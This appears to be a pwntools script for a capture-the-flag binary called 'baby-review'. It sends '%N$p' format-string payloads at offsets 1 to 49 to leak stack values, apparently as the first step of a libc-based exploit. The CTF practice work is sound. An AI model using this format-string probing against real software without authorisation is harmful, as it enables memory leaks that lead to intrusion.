from pwn import *

elf = ELF('./baby-review',checksec=False)
libc = ELF('libc.so.6',checksec=False)
p = process(elf.path)

p.recvline()
print(p.recvline().decode())
capital = "Paris"
p.sendline(capital.encode('utf-8'))

for i in range (1, 50):
    p.clean()
    p.sendline(b'5')
    p.recvline()
    payload = '%' + str(i) + '$p'
    p.sendline(payload.encode('utf-8'))
    p.clean()
    p.sendline(b'2')
    p.recvline()
    p.recvline()
    p.recvline()
    p.recvline()
    p.recvline()
    print("Offset " + str(i) + ": " + p.recvline().decode().strip())